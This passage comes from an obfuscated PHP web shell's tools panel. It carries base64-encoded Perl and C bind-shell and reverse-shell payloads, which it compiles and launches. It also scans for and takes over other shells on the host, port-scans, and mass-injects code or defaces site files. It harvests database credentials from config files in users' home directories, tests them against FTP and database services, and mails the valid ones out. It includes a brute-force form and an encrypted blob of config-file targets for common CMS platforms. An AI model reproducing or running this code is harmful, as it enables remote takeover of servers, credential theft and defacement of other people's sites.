VudGVyZWQpIHsKaW50IGk7CmZvcihpPTA7aTxzdHJsZW4oZW50ZXJlZCk7aSsrKSAKewppZihlbnRlcmVkW2ldID09ICdcbicpCmVudGVyZWRbaV0gPSAnXDAnOyAKaWYoZW50ZXJlZFtpXSA9PSAnXHInKQplbnRlcmVkW2ldID0gJ1wwJzsKfQppZiAoIXN0cmNtcChiYXNlLGVudGVyZWQpKQpyZXR1cm4gMDsKfQo=";
    $bndprt_pl = "IyEvdXNyL2Jpbi9wZXJsCiRTSEVMTD0iL2Jpbi9zaCI7CiRMSVNURU5fUE9SVD0lcG9ydCU7CnVzZSBTb2NrZXQ7CiRwcm90b2NvbD1nZXRwcm90b2J5bmFtZSgndGNwJyk7CnNvY2tldChTLCZQRl9JTkVULCZTT0NLX1NUUkVBTSwkcHJvdG9jb2wpIHx8IGRpZSAiQ2FudCBjcmVhdGUgc29ja2V0XG4iOwpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7CmJpbmQoUyxzb2NrYWRkcl9pbigkTElTVEVOX1BPUlQsSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7Cmxpc3RlbihTLDMpIHx8IGRpZSAiQ2FudCBsaXN0ZW4gcG9ydFxuIjsKd2hpbGUoMSkKewphY2NlcHQoQ09OTixTKTsKaWYoISgkcGlkPWZvcmspKQp7CmRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsKb3BlbiBTVERJTiwiPCZDT05OIjsKb3BlbiBTVERPVVQsIj4mQ09OTiI7Cm9wZW4gU1RERVJSLCI+JkNPTk4iOwpleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsKY2xvc2UgQ09OTjsKZXhpdCAwOwp9Cn0KCg==";
    $bckcon_pl = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2VjaG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHRhcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNURElOKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
    $bckcon_c = "I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzeXMvc29ja2V0Lmg+CiNpbmNsdWRlIDxuZXRpbmV0L2luLmg+CmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pCnsKIGludCBmZDsKIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47CiBjaGFyIHJtc1syMV09InJtIC1mICI7IAogZGFlbW9uKDEsMCk7CiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7CiBzaW4uc2luX3BvcnQgPSBodG9ucyhhdG9pKGFyZ3ZbMl0pKTsKIHNpbi5zaW5fYWRkci5zX2FkZHIgPSBpbmV0X2FkZHIoYXJndlsxXSk7IAogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJsZW4oYXJndlsyXSkpOyAKIGZkID0gc29ja2V0KEFGX0lORVQsIFNPQ0tfU1RSRUFNLCBJUFBST1RPX1RDUCkgOyAKIGlmICgoY29ubmVjdChmZCwgKHN0cnVjdCBzb2NrYWRkciAqKSAmc2luLCBzaXplb2Yoc3RydWN0IHNvY2thZGRyKSkpPDApIHsKICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7CiAgIGV4aXQoMCk7CiB9CiBzdHJjYXQocm1zLCBhcmd2WzBdKTsKIHN5c3RlbShybXMpOyAgCiBkdXAyKGZkLCAwKTsKIGR1cDIoZmQsIDEpOwogZHVwMihmZCwgMik7CiBleGVjbCgiL2Jpbi9zaCIsInNoIiwgTlVMTCk7CiBjbG9zZShmZCk7IAp9Cgo=";
    $bndportsrcs = array("bndprt.pl" => array("PERL", "perl %path"), "bndprt.c" =>
            array("C", "%path"));
    $bcsrcs = array("bckcon.pl" => array("PERL", "perl %path %host %port"),
            "bckcon.c" => array("C", "%path %host %port"));
    if (!@isset($brtest1))
        $brtest1 = 0;
    if (!@isset($brtest2))
        $brtest2 = 0;
    if (!@isset($brtest3))
        $brtest3 = 0;
    if (!@isset($brtest4))
        $brtest4 = 0;
    $users = array();
    if (@empty($brute_email))
        $brute_email = z7z('2', "email");
    if (@empty($dv_email))
        $dv_email = z7z('2', "email");
    if (@empty($cp_email))
        $cp_email = z7z('2', "email");
    if (@isset($brm) && ($brm == "2" || $brm == "3")) {
        $users = z8l();
    }
    $brute_type["1"] = z9y("343");
    if ($bpasswd) {
        $brute_type["2"] = z9y("344");
        $brute_type["3"] = z9y("345");
    }
    $available_arr = array();
    if ($bftp)
        $available_arr["FTP"] = "FTP";
    if ($bmysql)
        $available_arr["MySQL"] = "MySQL";
    if ($bmssql)
        $available_arr["MSSQL"] = "MSSQL";
    if ($bpostgres)
        $available_arr["PostgreSQL"] = "PostgreSQL";
    if ($boracle)
        $available_arr["Oracle"] = "Oracle";
    if (!@isset($brh))
        $brh = $saddr;
    if (!@isset($dvfiles))
        $dvfiles = "*conf*.php;*db*.php;";
    if (!@isset($dvuser))
        $dvuser = "user";
    if (!@isset($dvpass))
        $dvpass = "pass";
    if (!@isset($dvhost))
        $dvhost = "host";
    if (!@isset($dvbase))
        $dvbase = "base";
    $arr_vars = array("var" => "variable (\$var)", "arrayvar1" =>
            "arrayvar ('var'=>)", "arrayvar2" => "arrayvar (['var']=>)", "const" =>
            "constant (define)");
    $rec_arr = array();
    for ($i = 0; $i < 10; $i++)
        $rec_arr[($i + 1)] = ($i + 1) . " DIRS";
    $rec_arr["no"] = "NO";
    $arr_dvfind = array("dvdir" => z9y("301"));
    $arr_method = array("cpdir" => z9y("304"));
    if (($wwwdir = z3n()) !== false) {
        $arr_dvfind["docroot"] = z9y("326");
        $arr_method["cpdocroot"] = z9y("305");
    }
    if ($bpasswd) {
        $arr_dvfind["passwd"] = z9y("327");
        $arr_method["cppasswd"] = z9y("306");
    }
    $inj_method = array("top" => "Top of the file", "end" => "End of the file",
            "php1" => "Before first &lt;?", "html1" => "Before &lt;html&gt;", "html2" =>
            "Before &lt;/html&gt;", "body1" => "Before &lt;body.*&gt;", "body2" =>
            "Before &lt;/body&gt;", "php2" => "After last ?&gt;", "body3" =>
            "After &lt;body.*&gt;", "body4" => "After &lt;/body&gt;", "html3" =>
            "After &lt;html&gt;", "html4" => "After &lt;/html&gt;", "overwrite" =>
            "Deface (Overwrite file)");
    if (!@isset($bnd_port) || !@is_numeric($bnd_port))
        $bnd_port = z7z('2', 'bind_port');
    if (!@isset($bnd_pass) || @empty($bnd_pass))
        $bnd_pass = z7z('2', 'bind_pass');
    if (!@isset($bc_host) || @empty($bc_host))
        $bc_host = $yaddr;
    if (!@isset($bc_port) || !@is_numeric($bc_port))
        $bc_port = z7z('2', 'backcon_port');
    $bindmsg = $bcmsg = "";
    if (@isset($bindsubmit) && $bindsubmit) {
        $v = $bndportsrcs[$bnd_src];
        if (@empty($v)) {
            $bindmsg = z9y("272");
        } elseif (@fsockopen("localhost", $bnd_port, $errno, $errstr, 0.1)) {
            $bindmsg = z9y("275", $bnd_port);
        } else {
            $w = @explode(".", $bnd_src);
            $ext = $w[@count($w) - 1];
            unset($w[count($w) - 1]);
            $srcpath = $tempdir . @join(".", $w) . "." . @md5(@time()) . "." . $ext;
            $binpath = $tempdir . @join(".", $w) . @md5(@time());
            if ($ext == "pl") {
                $binpath = $srcpath;
            }
            @unlink($srcpath);
            $fp = @fopen($srcpath, "ab+");
            if (!$fp) {
                $bindmsg = z9y("271");
            } else {
                $data = @base64_decode(${@str_replace('.', '_', $bnd_src)});
                $data = @str_replace("%pass%", $bnd_pass, $data);
                $data = @str_replace("%port%", $bnd_port, $data);
                @fwrite($fp, $data, @strlen($data));
                @fclose($fp);
                if ($ext == "c") {
                    $retgcc = z9e("gcc -o " . $binpath . " " . $srcpath);
                    @unlink($srcpath);
                }
                $v[1] = @str_replace("%path", $binpath, $v[1]);
                $v[1] = @str_replace("//", "/", $v[1]);
                $retbind = z9e($v[1] . " > /dev/null &");
                @sleep(5);
                $sock = @fsockopen("localhost", $bnd_port, $errno, $errstr, 5);
                if (!$sock) {
                    $bindmsg = z9y("273", $bnd_port);
                } else {
                    $bindmsg = z9y("274", array($saddr, $bnd_port));
                }
            }
        }
    }
    if (@isset($bcsubmit) && $bcsubmit) {
        $v = $bcsrcs[$bc_src];
        if (@empty($v)) {
            $bcmsg = z9y("272");
        } else {
            $w = @explode(".", $bc_src);
            $ext = $w[count($w) - 1];
            unset($w[count($w) - 1]);
            $srcpath = $tempdir . join(".", $w) . "." . @md5(@time()) . "." . $ext;
            $binpath = $tempdir . join(".", $w) . @md5(@time());
            if ($ext == "pl") {
                $binpath = $srcpath;
            }
            @unlink($srcpath);
            $fp = @fopen($srcpath, "ab+");
            if (!$fp) {
                $bcmsg = z9y("271");
            } else {
                $data = @base64_decode(${str_replace('.', '_', $bc_src)});
                @fwrite($fp, $data, strlen($data));
                fclose($fp);
                if ($ext == "c") {
                    $retgcc = z9e("gcc -o " . $binpath . " " . $srcpath);
                    @unlink($srcpath);
                }
                $v[1] = @str_replace("%path", $binpath, $v[1]);
                $v[1] = @str_replace("%host", $bc_host, $v[1]);
                $v[1] = @str_replace("%port", $bc_port, $v[1]);
                $v[1] = @str_replace("//", "/", $v[1]);
                $retbind = z9e($v[1] . " > /dev/null &");
                $bcmsg = z9y("76", array($bc_host, $bc_port));
            }
        }
    }
    $selecta = $selectb = array();
    foreach ($bndportsrcs as $k => $v)
        $selecta[$k] = $v[0];
    foreach ($bcsrcs as $k => $v)
        $selectb[$k] = $v[0];
    if (!$win && ($sh_exec || $safe_exec)) {
        echo z3q(array(z9y("265") . (!@empty($bindmsg) ? " - " . @strtoupper($bindmsg) :
                ""), z9y("266") . (!@empty($bcmsg) ? " - " . @strtoupper($bcmsg) : "")), '46');
        echo z9m(2) . z7o() . z7j('', '4');
        echo z5x(array("act" => "tools", "d", "bindsubmit" => "1"), z10w(z5b() . z7u(z5t
            (z9y("267")) . z9c(z6u("bnd_pass", $bnd_pass, '4') . ":" . z6u("bnd_port", $bnd_port,
            '1') . ":" . z3m("bnd_src", $selecta, '1', 1) . z8b(z9y("268"), '7'))) . z5b(),
            '2'));
        echo z7f() . z7j('', '46');
        echo z5x(array("act" => "tools", "d", "bcsubmit" => "1"), z10w(z5b() . z7u(z5t(z9y
            ("434")) . z9c(z6u("bc_host", $bc_host, '4') . ":" . z6u("bc_port", $bc_port,
            '1') . ":" . z3m("bc_src", $selectb, '1', 1) . z8b(z9y("435"), '7'))) . z5b(),
            "2"));
        echo z7f() . z7y() . z10q();
        $ii = 0;
        if (@is_dir($tempdir)) {
            if ($dh = @opendir($tempdir)) {
                while (($file = @readdir($dh)) !== false) {
                    if (@preg_match('/^(bndprt|bckcon)\.?[a-zA-Z0-9]{32}/', $file)) {
                        if (@isset($clean)) {
                            @unlink($tempdir . $file);
                        } else {
                            $ii++;
                        }
                    }
                }
                @closedir($dh);
            }
        }
        if ($ii != 0)
            echo z3q(@strtoupper(z9y("269", $ii)) . z5x(array("act" => "tools", "d", "clean" =>
                    "1"), z8b(z9y("270"), '7')));
    }
    $pscmsg = '';
    $startscan = 0;
    if (@isset($pscan) && $pscan && !@empty($pscip) && @is_numeric($pscps) && @
        is_numeric($pscpe)) {
        if ($pscps < 0 || $pscps > 65535 || $pscpe < 0 || $pscpe > 65535) {
            $pscmsg = z9y("280");
        } else {
            $startscan = 1;
        }
    }
    echo z3q(array(z9y("281"), z9y("277") . ($pscmsg != '' ? " : " . $pscmsg : '')),
        "46");
    if (!@isset($pscip))
        $pscip = $saddr;
    if (!@isset($pscps))
        $pscps = "0";
    if (!@isset($pscpe))
        $pscpe = "65535";
    echo z9m(2) . z7o() . z7j('', '4') . z6s() . z9m('2') . z7l() . z9v("shellhunt",
        "1") . z9v("act", "tools") . z9v("d") . z7u(z5t(z9y("282")) . z9c(z3m("shaction",
        array("view" => z9y("284"), "viewall" => z9y("285"), "own" => z9y("286"),
            "ownall" => z9y("287")), "5", 1) . ":" . z3m("shrecursive", $rec_arr, "1", 1) .
        z8b(z9y("436"), "7"))) . z7u(z5t(z9y("283")) . z9c(z5y("shpath", $d, "0"))) .
        z9l() . z10q() . z6s() . z7f() . z7j('', '46') . z6s() . z9m('2') . z5x(array("act" =>
            "tools", "d", "pscan" => "1"), z7u(z5t(z9y("278")) . z9c(z6u("pscip", $pscip,
        "4") . ":" . z6u("pscps", $pscps, '1') . "-" . z6u("pscpe", $pscpe, '1') . z8b(z9y
        ("279"), '7')))) . z10q() . z6s() . z7f() . z7y() . z10q();
    if (@isset($shellhunt) && $shellhunt) {
        $fpaths = $tpaths = $spaths = $glob = $shells = array();
        $tpath = '';
        $tpaths[] = '';
        if (@is_numeric($shrecursive)) {
            for ($i = 0; $i < $shrecursive; $i++) {
                $tpath .= '*/';
                $tpaths[] = $tpath;
            }
        } else {
            $tpaths[] = '*/';
        }
        foreach (@array_unique($tpaths) as $tpath) {
            $fpaths[] = $tpath . "*.php";
        }
        foreach (@array_unique($fpaths) as $fpath) {
            $spaths[] = z1k($shpath) . $fpath;
        }
        unset($fpaths);
        unset($tpaths);
        foreach ($spaths as $spath) {
            $tglob = @glob($spath);
            if (@is_array($tglob) && @count($tglob) > 0) {
                foreach ($tglob as $tfile) {
                    if (!@in_array($tfile, $glob) && (@realpath($tfile) != @realpath(__file__)))
                        $glob[] = $tfile;
                }
                $glob = @array_unique($glob);
            }
        }
        unset($spaths);
        if (@count($glob) > 0) {
            $viewall = $rcown = 0;
            switch ($shaction) {
                case 'view':
                    $viewall = $rcown = 0;
                    break;
                case 'viewall':
                    $viewall = 1;
                    $rcown = 0;
                    break;
                case 'own':
                    $viewall = 0;
                    $rcown = 1;
                    break;
                case 'ownall':
                    $viewall = $rcown = 1;
                    break;
                default:
                    $viewall = $rcown = 0;
                    break;
            }
            foreach ($glob as $tmp) {
                if (($ttype = z2r($tmp, $viewall, $rcown)) !== false) {
                    $shells[$tmp] = $ttype;
                }
            }
        }
        if (@count($shells) > 0) {
            if (($wwwdir = z3n()) !== false) {
                $url = z8u();
                $url_a = @parse_url($url);
                if (@isset($url_a["host"])) {
                    $shellhost = $url_a["host"];
                }
            }
            $external = 1;
            echo z3q(z9y("288"), "1") . z9m("2") . z7u(z9c(z9y("292"), "13", "2") . z9c(z9y
                ("293"), "13") . z9c(z9y("294"), "13") . z9c(z9y("295"), "13", "3"));
            $tr = 0;
            foreach ($shells as $shell => $shelltype) {
                $wwwlink = "-";
                if (@isset($shellhost) && @strstr($shell, $wwwdir) !== false) {
                    $wwwlink = z10t('http://' . $shellhost . '/' . @substr($shell, @strlen($wwwdir)) .
                        '"', z9y("296"), "1", 1);
                }
                echo z7u(z9c(z2l($shell), "14", "2") . z9c($shelltype, "14") . z9c($wwwlink,
                    "14") . z9c(z0o($shell, "1") . z5x(array("act" => "f", "ft" => "rcown", "d" =>
                        z3a($shell), "f" => z2l($shell)), z8b(z9y("297"), "18"), "1"), "14", "3"), ($tr %
                    2 ? '0' : '1'));
                $tr++;
            }
            echo z10q();
        }
    }
    if ($startscan) {
        $pscan = z8j($pscip, $pscps, $pscpe);
        if (@!empty($pscan)) {
            echo z3q(z9y("289"));
            echo z6s() . z10w(z7u(z6l(z5w('', '1') . $pscan . z5q())), '2') . z6s();
        }
    }
    echo z3q(array(z9y("298"), z9y("309")), "46");
    echo z9m(2) . z7o() . z7j('', '4') . z6s() . z9m('2') . z7l() . z9v("cpfind",
        "1") . z9v("act", "tools") . z9v("d") . z7u(z5t(z9y("299")) . z9c(z5y("cphost",
        "127.0.0.1", "5") . ":" . z5y("cpuser", "root", "4") . ":" . z3m("cpservice", $available_arr,
        "1", 1))) . z7u(z5t(z9y("300")) . z9c(z5y("cpfiles", "*conf*.php;*db*.php;", "5") .
        ":" . z3m("cpmethod", $arr_method, "4", 1) . ":" . z3m("cprecursive", $rec_arr,
        "1", 1))) . z7u(z5t(z9y("301")) . z9c(z5y("cpdir", $d, "0"))) . ($bmail ? z7u(z5t
        (z9y("302")) . z9c(z5y("cp_email", "", '2') . z9f("cp_log"))) : '') . z7u(z5t(z9x
        ()) . z9c(z8b(z9y("307"), "7") . z9x() . z5u("cppassfile", z9y("303"),
        "cppassfile"))) . z9l() . z10q() . z6s() . z7f() . z7j('', '46') . z6s() . z9m('2') .
        z7l() . z9v("inject", "1") . z9v("act", "tools") . z9v("d") . z7u(z5t(z9y("310")) .
        z9c(z5y("injfiles", "*.html;index.php;", "5") . ":" . z3m("injmethod", $inj_method,
        "4", 1) . ":" . z3m("injrecursive", $rec_arr, "1", 1))) . z7u(z5t(z9y("311")) .
        z9c(z5y("injdir", $d, "0"))) . z9d(z5t(z9y("312")) . z9c(z5w("injcode", "6") . (@
        isset($injcode) ? @htmlspecialchars($injcode) : '') . z5q())) . z7u(z5t(z9x()) .
        z9c(z8b(z9y("313"), "7"))) . z9l() . z10q() . z6s() . z7f() . z7y() . z10q();
    if (@isset($inject) && $inject) {
        $fpaths = $tpaths = $spaths = $glob = array();
        $farr = @explode(";", $injfiles);
        $tpath = '';
        $tpaths[] = '';
        if (@is_numeric($injrecursive)) {
            for ($i = 0; $i < $injrecursive; $i++) {
                $tpath .= '*/';
                $tpaths[] = $tpath;
            }
        } else {
            $tpaths[] = '*/';
        }
        foreach (@array_unique($tpaths) as $tpath) {
            foreach (@array_unique($farr) as $fpath) {
                $fpath = @trim($fpath);
                if (!@empty($fpath)) {
                    $fpaths[] = $tpath . $fpath;
                }
            }
        }
        foreach (@array_unique($fpaths) as $fpath) {
            $spaths[] = z1k($injdir) . $fpath;
        }
        unset($fpaths);
        unset($tpaths);
        foreach ($spaths as $spath) {
            $tglob = @glob($spath);
            if (@count($tglob) > 0) {
                foreach ($tglob as $tfile) {
                    if (!@in_array($tfile, $glob))
                        $glob[] = $tfile;
                }
                $glob = @array_unique($glob);
            }
        }
        unset($spaths);
        if (@count($glob) > 0) {
            $i = 0;
            foreach ($glob as $file) {
                if (z3v($injcode, $injmethod, $file)) {
                    if ($i == 0) {
                        echo z3q(z9y("314")) . z6s() . z9m("2") . z6f() . z6q() . z5w('', '1');
                        z5o();
                    }
                    echo $file . "\r\n";
                    $i++;
                }
            }
            if ($i > 0)
                echo z5q() . z7f() . z7y() . z10q() . z6s();
        }
    }
    if (@isset($cpfind) && $cpfind && (!@empty($cpuser) || $cpmethod == "cppasswd")) {
        echo z3q(z9y("308")) . z6s();
        echo z9m('2') . z7o() . z6q() . z5w("", "1");
        z5o();
        $fpaths = $tpaths = $spaths = $glob = array();
        $farr = @explode(";", $cpfiles);
        $tpath = '';
        $tpaths[] = '';
        if (@is_numeric($cprecursive)) {
            for ($i = 0; $i < $cprecursive; $i++) {
                $tpath .= '*/';
                $tpaths[] = $tpath;
            }
        } else {
            $tpaths[] = '*/';
        }
        foreach (@array_unique($tpaths) as $tpath) {
            foreach (@array_unique($farr) as $fpath) {
                $fpath = @trim($fpath);
                if (!@empty($fpath)) {
                    $fpaths[] = $tpath . $fpath;
                }
            }
        }
        switch ($cpmethod) {
            case 'cpdir':
                $spaths[$cpuser] = array();
                foreach (@array_unique($fpaths) as $fpath) {
                    $spaths[$cpuser][] = z1k($cpdir) . $fpath;
                }
                break;
            case 'cpdocroot':
                $spaths[$cpuser] = array();
                foreach (@array_unique($fpaths) as $fpath) {
                    $spaths[$cpuser][] = z1k($wwwdir) . $fpath;
                }
                break;
            case 'cppasswd':
                $uarr = z8l(1);
                if (@count($uarr) > 0) {
                    foreach ($uarr as $uk => $arr) {
                        if ($arr[1] != '/' && !@preg_match('#^(/var/run|/var/log|/var/cache|/var/mail|/var/cache|/var/backup|/usr/games|/lib|/var/lib|/var/tmp|/tmp|/dev|/proc|/sbin|/usr/sbin|/usr/local/sbin|/bin|/usr/bin|/usr/local/bin)#',
                            $arr[1]) && z4j($arr[1])) {
                            $spaths[$arr[0]] = array();
                            foreach (@array_unique($fpaths) as $fpath) {
                                $spaths[$arr[0]][] = z1k($arr[1]) . $fpath;
                            }
                        }
                    }
                }
                unset($uarr);
                break;
            default:
                break;
        }
        unset($fpaths);
        unset($tpaths);
        foreach ($spaths as $user => $spath_arr) {
            foreach ($spath_arr as $spath) {
                $tglob = @glob($spath);
                if (@is_array($tglob) && @count($tglob) > 0) {
                    if (!@isset($glob[$user]))
                        $glob[$user] = array();
                    foreach ($tglob as $tfile) {
                        if (!@in_array($tfile, $glob[$user]))
                            $glob[$user][] = $tfile;
                    }
                    $glob[$user] = @array_unique($glob[$user]);
                }
            }
        }
        unset($spaths);
        if (@count($glob) > 0) {
            foreach ($glob as $user => $file_arr) {
                if (@count($file_arr) > 0) {
                    foreach ($file_arr as $tfile) {
                        z2p($tfile, $user);
                    }
                }
            }
        }
        $log = '';
        $found = 0;
        if (@isset($passarray) && @count($passarray) > 0) {
            foreach ($passarray as $user => $passwords) {
                if (@count($passwords) > 0) {
                    foreach ($passwords as $pass) {
                        if (@isset($cppassfile) && $cppassfile) {
                            echo "$user $pass\r\n";
                        } else {
                            if (!@isset($stop))
                                $stop = 0;
                            if ($cpservice == "FTP" && $bftp && !$stop) {
                                $test = z3l($cphost, $user, $pass, 21, 3);
                                if ($test == "failed") {
                                    $stop = 1;
                                } elseif ($test == "valid") {
                                    $found++;
                                    $tmp = "host: $cphost\r\n";
                                    $tmp .= "user: $user\r\n";
                                    $tmp .= "pass: $pass\r\n";
                                    $tmp .= "service: $cpservice\r\n\r\n";
                                    echo $tmp;
                                    $log .= $tmp;
                                }
                            } else {
                                if (z3h($cphost, $user, $pass, '', $cpservice) == "valid") {
                                    $found++;
                                    $tmp = "host: $cphost\r\n";
                                    $tmp .= "user: $user\r\n";
                                    $tmp .= "pass: $pass\r\n";
                                    $tmp .= "service: $cpservice\r\n\r\n";
                                    echo $tmp;
                                    $log .= $tmp;
                                }
                            }
                        }
                    }
                }
            }
        }
        if ($cp_log == "1" && $found > 0 && $bmail) {
            @mail($cp_email, "$cpservice|$cphost", $log);
        }
        echo z5q() . z7y() . z7f() . z10q() . z6s();
    }
    $arr_cfgs = array('' => "Select Software", "joomla" => "Joomla", "opencart" =>
            "Opencart", "osc" => "Oscommerce", "pinnaclecart" => "Pinnaclecart",
            "squirrelcart" => "Squirrelcart", "wordpress" => "Wordpress", "xcart" =>
            "X-cart", "zencart" => "Zen-cart", "all" => "All of above");
    if (@isset($sqlfind) && $sqlfind && @isset($dvdefined) && !@empty($dvdefined) &&
        @isset($dvpasswd) && !@empty($dvpasswd)) {
        $dvcfgs = "nVrkA0mFRDYCHunZ3cN9mLz5pNShsm0r8L4drmb0FTMSPnfIqA4j+Uq6gfLYuldrtsMMNTgK5UoZ3ViSZ5jne7teFyngMstdNqjRBr1NSDZgOnhkT05Hm25ikOaooEva9Wc965VdcbUYpnqs8xq5VDaKeBpRkS1VAxaLTKOr899pfM1pm/v7Rdctk4H0A4bXSxn5Lup5HAdjjl1EzocQXar6WsYumziDYD/EOBgmBiNVl/+kGwfPs64vQfzVuttfcY7tizzenPmMJgE8BGj2AZuXWtxnl3UO4CAPBOdtwkrv+PwMsYhffkEyh17eC3BufrqDkWAQhECUhs8dnp1R0g5/ByuJMebTOe9qwpDDh5goXgYhtjTthSEu4XShBdKNHg+ve/4/QhiJb0hSq8ezOZHCmW1PZ/0gyrywZx2aucGJeCZx3mxnfjiKAGHcnJaiFDV09dXZRuvfGe6SGiPq84bErZThDHORRs5Fz8NivUxj9m+WW7QRtak8EOUiIcTlbPIP85XIWob21V3v83fAAOAr9oJUJJ8gpdfqOLIyJyfa5Kvas2O1DHnvqoS6GsEGGrfnlXHoTeiw47nGeR4SoC7BFPu0hM3hnC4QPR8jrI7D5xYYO3wzK4uhJU4f5Ot8GuqNTsjE1LTyuBqJbeY4I5tcmQLsFYmqyGEQXP4NDExH7OlBMKSlpVkMEeLtouWDMdeAhiYiyWM20jy2VJi5xiQevlBfG/briKFxmCwNdmF2JexxL6qlRGn+Rdx9VYGFot2rxR7y2JTeViten/QNci1L4xAWoHaT1EMCd0zxP/ZYRcBgvzt4326NG1WBspNY6SeSnbBQvPoMcrnOjXHrARy1NyzAUHGhtWeBoFAlShuSA2c4cqGEQTrs1PPKxpTbBacuNLMmm+wvMNvBhdt2HTfZTjdYyEn0qEfOVPTWb8LWPKWxA/zIJ5OYeVH69g0b4CPNknHes4yNY6D7RxK905EY0DMMI1h8HY1n7r7ZvWd84O3VBf904vQUILRA/vhyRb7oKUHttyCruZoG4lgAQGg78PHaYugtc9SFu7Pq41Cn";
        $ddcfgs = zrc4::zdec(@md5($dvpasswd), @base64_decode($dvcfgs));
        if ($dvdefined == "all") {
            $arr_mass = array();
            $arr_mass_paths = array();
            foreach ($arr_cfgs as $tcfg => $tsoft) {
                if ($tcfg != '' && $tcfg != "all") {
                    $tddcfg = @explode("|" . $tcfg . "|", $ddcfgs);
                    $tddcfg = @substr($tddcfg[1], 0, @strpos($tddcfg[1], "|"));
                    @list($tdvuser, $tdtuser, $tdvpass, $tdtpass, $tdvbase, $tdtbase, $tdvhost, $tdthost,
                        $tdvfiles, ) = @explode(",", $tddcfg);
                    $arr_mass[$tsoft] = array($tdvuser, $tdtuser, $tdvpass, $tdtpass, $tdvbase, $tdtbase,
                            $tdvhost, $tdthost);
                    $tefiles = @explode(";", $tdvfiles);
                    foreach ($tefiles as $tefile) {
                        $tefile = @trim($tefile);
                        if (!@empty($tefile) && !@in_array($tefile, $arr_mass_paths))
                            $arr_mass_paths[] = $tefile;
                    }
                }
            }
        } else {
            if (@strpos($ddcfgs, "|" . $dvdefined . "|") !== false) {
                $ddcfg = @explode("|" . $dvdefined . "|", $ddcfgs);
                $ddcfg = @substr($ddcfg[1], 0, @strpos($ddcfg[1], "|"));
                @list($dvuser, $dtuser, $dvpass, $dtpass, $dvbase, $dtbase, $dvhost, $dthost, $dvfiles, ) =
                    @explode(",", $ddcfg);
            }
        }
    }
    echo z3q(array(z9y("315"), z9y("337")), '46');
    echo z9m(2) . z7o() . z7j('', '4') . z6s() . z9m('2') . z7l() . z9v("sqlfind",
        "1") . z9v("act", "tools") . z9v("d") . z7u(z5t(z9y("316")) . z9c(z5y("dvuser",
        "", "5") . ":" . z3m("dtuser", $arr_vars, "4", 1) . z9x() . z9y("328"))) . z7u(z5t
        (z9y("317")) . z9c(z5y("dvpass", "", "5") . ":" . z3m("dtpass", $arr_vars, "4",
        1) . z9x() . z9y("328"))) . z7u(z5t(z9y("318")) . z9c(z5y("dvbase", "", "5") .
        ":" . z3m("dtbase", $arr_vars, "4", 1) . z9x() . z9y("329"))) . z7u(z5t(z9y("319")) .
        z9c(z5y("dvhost", "", "5") . ":" . z3m("dthost", $arr_vars, "4", 1) . z9x() .
        z9y("329"))) . z7u(z5t(z9y("320")) . z9c(z3m("dvdefined", $arr_cfgs, "5", 1) .
        ":" . z5y("dvpasswd", "", "4") . z9x() . "anti-lamerz :)")) . z7u(z5t(z9y("321")) .
        z9c(z5y("dvfiles", "", "5") . ":" . z3m("dvfind", $arr_dvfind, "4", 1) . ":" .
        z3m("dtrecursive", $rec_arr, "1", 1))) . z7u(z5t(z9y("322")) . z9c(z5y("dvdir",
        $d, "0"))) . ($bmail ? z7u(z5t(z9y("302")) . z9c(z5y("dv_email", "", '2') . z9f
        ("dv_log"))) : '') . z7u(z5t(z9x()) . z9c(z8b(z9y("323"), "7") . z9x() . z5u("dvsqltest",
        z9y("324"), "dvsqltest"))) . z9l() . z10q() . z6s() . z7f() . z7j('', '46') .
        z6s() . z9m('2') . z7l() . z9v("startbrute", "1") . z9v("act", "tools") . z9v("d") .
        z7u(z5t(z9y("338")) . z9c(z5y("brh", "", "4") . ":" . z5y("brp", "", "6") . ":" .
        z3m("bservice", $available_arr, "4", 1))) . z7u(z5t(z9y("339")) . z9c(z5y("bru",
        "", '4') . ":" . z5y("brdb", "", '5'))) . z7u(z5t(z9y("340")) . z9c(z9g("wordlist",
        '2'))) . z7u(z5t(z9y("341")) . z9c(z3m("brm", $brute_type, '2', 1))) . z7u(z5t(z9y
        ("342")) . z9c(z5u("brtest1", "user:resu", "brtest1") . z9x(1) . z5u("brtest2",
        "user:user1", "brtest2") . z9x(1) . z5u("brtest3", "user:user123", "brtest3"))) .
        z7u(z5t(z9x()) . z9c(z5u("brtest4", "Transform password to p@55w0rd", "brtest4"))) . ($bmail ?
        z7u(z5t(z9y("302")) . z9c(z6u("brute_email", $brute_email, '2') . z9f("brute_log"))) :
